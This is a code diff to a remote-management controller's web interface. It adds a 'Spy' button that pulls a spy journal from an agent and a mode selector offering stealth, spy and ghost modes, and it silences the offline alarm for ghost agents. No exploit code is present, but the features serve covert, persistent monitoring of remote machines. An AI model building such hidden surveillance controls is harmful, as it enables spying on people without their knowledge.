@@ -235,6 +235,7 @@ html{touch-action:manipulation}
       <button class="btn btn-small" id="reconnectBtn" style="margin-left:auto">⟳ Reconnect</button>
       <button class="btn btn-small" id="healthBtn" title="Quick health check on selected agent">♥ Health</button>
       <button class="btn btn-small" id="logsBtn" title="Pull the selected agent's log tail (get-agent-log)">📄 Logs</button>
+      <button class="btn btn-small" id="spyBtn" title="Pull the spy journal tail (get-spy-log, spy mode)">📓 Spy</button>
       <button class="btn btn-small" id="verBtn" title="Compare agent version vs controller">≡ Versions</button>
       <button class="btn btn-small" id="pushUpdateBtn" title="Push bundled agent update to selected agent">⇪ Update</button>
       <button class="btn btn-small" id="pushUpdateAllBtn" title="Push bundled update to every outdated agent at once" style="display:none">⇪ Update All</button>
@@ -427,6 +428,7 @@ html{touch-action:manipulation}
           <div style="margin-top:8px;display:flex;gap:8px;align-items:center"><label class="toggle" id="s_compact" title="Compact declutter mode"><input type="checkbox"/> Compact UI</label></div>
           <div style="margin-top:8px;display:flex;gap:8px;align-items:center"><label class="toggle" id="autoUpdToggle" title="Push the bundled agent version automatically when an outdated agent checks in (once per agent+version; rolled-back versions are never re-pushed)"><input type="checkbox"/> Auto-update agents</label></div>
           <div style="margin-top:8px;display:flex;gap:8px;align-items:center"><label class="toggle" id="authToggle" title="Reject agents with no registration token. Enable only after every managed agent carries the token (via -token installs or fleet-wide set-agent-token), or they will be locked out."><input type="checkbox"/> Enforce agent tokens</label><button class="btn btn-small" id="showTokenBtn" title="Show the registration token (to provision new agents)">token</button></div>
+          <div style="margin-top:8px;display:flex;gap:8px;align-items:center"><label style="font-size:11px;color:#888" title="Agent operation mode for the selected agent (set-mode restarts into it)">Agent mode</label><select id="modeSel" class="select" title="normal=full • stealth=survive-only • spy=stealth+journal • ghost=wake cycles • performance=max feel • kiosk=screen+input • audit=read-only"><option value="normal">normal</option><option value="stealth">stealth</option><option value="spy">spy</option><option value="ghost">ghost</option><option value="performance">performance</option><option value="kiosk">kiosk</option><option value="audit">audit</option></select></div>
           <div id="settingsInfo" style="margin-top:12px;font-size:11px;color:#888">RMM settings — changes apply instantly.</div>
         </div>
       </div>
@@ -466,8 +468,8 @@ function renderConns(filter=""){
     const seen=off?(" • "+seenText(a.seenAgoSec)):("");
     d.className="conn-item"+(selected?.id===a.id?" active":"")+(off?" offline":"");
     const lat = (a.latency==null||a.latency>900000) ? "--" : a.latency;
-    const ver=a.version?` • ${a.version}`:""; const upd=a.outdated?` <span style="color:#FFD54F" title="Outdated — click Update All">⇪</span>`:""; const prot=protOK(a.version)?` <span title="Self-healing protection: dual backup + watchdog + health heartbeat${a.prot?` • layers ${a.prot}`:""}">🛡</span>`:""; const rb=a.rollbackBad?` <span style="color:#FF5252" title="Rolled back: v${a.rollbackBad} crashed, restored v${a.rollbackTo||"?"} — that version is held back from future pushes">⚠️</span>`:""; const ut=a.untrusted?` <span title="No registration token (untrusted) — enforce tokens in Settings to lock such agents out">🔓</span>`:"";
-    d.innerHTML=`<span class="conn-dot ${a.connected?"dot-online":"dot-offline"}"></span><div class="conn-meta"><div class="conn-name">${a.hostname}${upd}${prot}${rb}${ut}</div><div class="conn-sub">${a.id} • ${a.user}${a.remote?" • "+a.remote:""}${a.e2e?" • 🔒":""}${ver}${seen}</div></div>${off?'<span class="forgetbtn" title="Forget (remove from controller)" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">✕</span>':""}<span class="copybtn" title="Copy hostname" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">⧉</span><span class="conn-lat">${lat}ms</span>`;
+    const ver=a.version?` • ${a.version}`:""; const upd=a.outdated?` <span style="color:#FFD54F" title="Outdated — click Update All">⇪</span>`:""; const prot=protOK(a.version)?` <span title="Self-healing protection: dual backup + watchdog + health heartbeat${a.prot?` • layers ${a.prot}`:""}">🛡</span>`:""; const rb=a.rollbackBad?` <span style="color:#FF5252" title="Rolled back: v${a.rollbackBad} crashed, restored v${a.rollbackTo||"?"} — that version is held back from future pushes">⚠️</span>`:""; const ut=a.untrusted?` <span title="No registration token (untrusted) — enforce tokens in Settings to lock such agents out">🔓</span>`:""; const md=(a.mode&&a.mode!=="normal")?` <span style="color:#CE9178" title="Operation mode: ${a.mode}">${a.mode==="stealth"?"🥷":a.mode==="spy"?"🕵️":a.mode==="ghost"?"👻":a.mode==="performance"?"🚀":a.mode==="kiosk"?"🖥️":"📖"}</span>`:"";
+    d.innerHTML=`<span class="conn-dot ${a.connected?"dot-online":"dot-offline"}"></span><div class="conn-meta"><div class="conn-name">${a.hostname}${upd}${prot}${rb}${ut}${md}</div><div class="conn-sub">${a.id} • ${a.user}${a.remote?" • "+a.remote:""}${a.e2e?" • 🔒":""}${ver}${seen}</div></div>${off?'<span class="forgetbtn" title="Forget (remove from controller)" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">✕</span>':""}<span class="copybtn" title="Copy hostname" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">⧉</span><span class="conn-lat">${lat}ms</span>`;
     d.onclick=()=>{selected=a; renderConns($("connFilter").value); updateActive(); renderDeviceSwitch(); if(typeof updateConnButtons==="function") updateConnButtons();};
     d.ondblclick=()=>{selected=a; renderConns($("connFilter").value); updateActive(); renderDeviceSwitch(); if(typeof updateConnButtons==="function") updateConnButtons(); const cb=$("connectBtn"); if(cb&&cb.onclick) cb.onclick();};
     const cp=d.querySelector(".copybtn");
@@ -516,6 +518,7 @@ function updateActive(){
   if(typeof restoreLocalChoice==="function") restoreLocalChoice(true);
   const dot=$("remoteCursor"); if(dot) dot.style.display="none";
   if(typeof autoVersionCheck==="function") autoVersionCheck();
+  if(typeof refreshModeSel==="function") refreshModeSel();
 }
 
 // Tabs
@@ -586,7 +589,7 @@ function connectWS(){
               const ok=cv&&mv[1]===cv;
               addTerm(`Agent ${mv[1]} vs controller ${cv||"?"} — ${ok?"up to date ✓":"UPDATE AVAILABLE"}`, ok?"out":"err");
               toast(ok?"Agent up to date":"Agent outdated: "+mv[1]+" — push update?", ok?"":"err");
-              if(badge){ const sh=protOK(mv[1])?" 🛡":""; badge.textContent=ok?("agent v"+mv[1]+sh):("agent v"+mv[1]+" — UPDATE"); badge.style.color=ok?"#888":"#FFD54F"; badge.title=protOK(mv[1])?"Self-healing protection active":"No self-healing (update the agent)"; }
+              if(badge){ const sh=protOK(mv[1])?" 🛡":""; const md=(selected&&selected.mode&&selected.mode!=="normal")?(" • "+selected.mode):""; badge.textContent=ok?("agent v"+mv[1]+sh+md):("agent v"+mv[1]+" — UPDATE"+md); badge.style.color=ok?"#888":"#FFD54F"; badge.title=(protOK(mv[1])?"Self-healing protection active":"No self-healing (update the agent)")+md; }
             }
           }
           if(t==="out" && /^upload complete:/.test(m.data||"")){ toast("Upload complete"); if(typeof refreshFiles==="function") refreshFiles(true); if(typeof pendingUpload!=="undefined"&&pendingUpload && (m.data||"").startsWith("upload complete: "+pendingUpload.path)){ const r=pendingUpload; pendingUpload=null; r.resolve(); } }
@@ -702,9 +705,10 @@ function mergeAgents(incoming){
     }
     // Dead-man alarm: a protected (hardened) agent that goes dark instead
     // of just going stale. Fires once per outage; clears on reconnect.
+    // Ghost agents sleep by design — never alarm for them.
     if(a&&a.id&&!a.id.startsWith("manual-")&&!a.id.startsWith("conn-")){
       if(a.connected){ delete deadManAlarmed[a.id]; }
-      else if(a.version&&protOK(a.version)){
+      else if(a.version&&protOK(a.version)&&a.mode!=="ghost"){
         const seen=a.seenAgoSec||0;
         if(seen>300&&!deadManAlarmed[a.id]){
           deadManAlarmed[a.id]=true;
@@ -1388,6 +1392,20 @@ $("autoUpdToggle").onclick=()=>{
     .catch(e=>addTerm("Auto-update toggle failed: "+(e.message||e),"err"));
 };
 $("logsBtn").onclick=()=>{ if(!needAgent()) return; sendCmdVal("get-agent-log 150"); addTerm("Pulling log tail from "+(selected.hostname||selected.id)+"…","out"); };
+$("spyBtn").onclick=()=>{ if(!needAgent()) return; sendCmdVal("get-spy-log 120"); addTerm("Pulling spy journal from "+(selected.hostname||selected.id)+"…","out"); };
+// Agent operation mode selector (set-mode restarts the agent into it).
+function refreshModeSel(){
+  const s=$("modeSel"); if(!s) return;
+  const cur=(selected&&selected.mode)||"normal";
+  if(![...s.options].some(o=>o.value===cur)){ const o=document.createElement("option"); o.value=cur; o.textContent=cur; s.appendChild(o); }
+  s.value=cur;
+}
+$("modeSel")?.addEventListener("change", e=>{
+  if(!needAgent()){ refreshModeSel(); return; }
+  const m=e.target.value;
+  if(!confirm(`Set ${selected.hostname} to ${m} mode? The agent restarts into it.`)) { refreshModeSel(); return; }
+  sendCmdVal("set-mode "+m); addTerm(`Setting mode → ${m} (agent restarts)…`,"out");
+});
 // Agent-token enforcement: flip only after the whole fleet carries the
 // token (see Settings checkbox title), or agents get locked out.
 function refreshAuth(){
